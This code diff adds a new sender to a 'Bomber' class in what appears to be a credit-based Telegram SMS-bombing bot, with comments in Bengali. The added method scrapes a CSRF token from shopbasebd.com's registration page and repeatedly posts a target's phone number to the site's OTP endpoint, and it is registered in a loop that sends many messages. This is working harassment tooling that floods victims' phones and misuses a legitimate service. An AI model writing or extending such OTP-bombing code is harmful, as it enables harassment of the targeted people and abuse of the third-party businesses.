@@ -197,6 +197,64 @@ class Bomber:
       pass
     return False
 
+
+  def shopbasebd(self):
+    url = "https://shopbasebd.com/store/registration/sendOTP"
+    session = requests.Session()
+
+    headers = {
+        "Host": "shopbasebd.com",
+        "User-Agent": self.getUserAgent(),
+        "Accept": "*/*",
+        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
+        "Origin": "https://shopbasebd.com",
+        "Referer": "https://shopbasebd.com/store/registration",
+        "X-Requested-With": "XMLHttpRequest",
+        "Accept-Language": "en-GB,en-US;q=0.9,en;q=0.8",
+    }
+
+    try:
+      # ১. প্রথমে রেজিস্ট্রেশন পেজ থেকে কুক্ষিগত কুকি এবং CSRF টোকেন ফেচ করা
+      get_res = session.get(
+          "https://shopbasebd.com/store/registration",
+          headers=headers,
+          timeout=5,
+      )
+      if get_res.status_code == 200:
+        # সুন্দরভাবে পেজ থেকে টোকেন বের করার জন্য BeautifulSoup বা Simple String Split ব্যবহার করা যায়
+        html_content = get_res.text
+        token = ""
+
+        # 간단하게 _token ইনপুট ফিল্ড থেকে খুঁজে নেওয়া
+        if 'name="_token" value="' in html_content:
+          token = (
+              html_content.split('name="_token" value="')[1]
+              .split('"')[0]
+              .strip()
+          )
+
+        if token:
+          payload = {"number": self.user_mobile, "_token": token}
+          r = session.post(url, data=payload, headers=headers, timeout=5)
+
+          # রেসপন্স চেক (Laravel সাধারণত JSON বা Success মেসেজ দেয়)
+          if r.status_code == 200:
+            return True
+    except:
+      pass
+    return False
+
+
+#করলাম এড
+
+
+
+
+
+
+
+
+
   def start(self):
     current_credits = user_credits.get(self.chat_id, 0)
     if current_credits < 1:
@@ -231,6 +289,7 @@ class Bomber:
         self.bdtickets,
         self.shopz,
         self.ghorerbazar,
+        self.shopbasebd, #নতুন আসচে 
     ]
 
     while counter < self.number_of_messege:
@@ -448,7 +507,7 @@ def handle_text_buttons(message):
     bot.send_message(
         chat_id,
         (
-            "👑 **Developer:**WQ OWNER (ওস্তাদ)\n⚡ **Brand:** GRAPIXY HUB\n🌐"
+            "👑 **Developer:**WQ OWNER@ (ওস্তাদ)\n⚡ **Brand:** GRAPIXY HUB\n🌐"
             " **Hosted on:** None"
         ),
         reply_markup=get_reply_keyboard(),
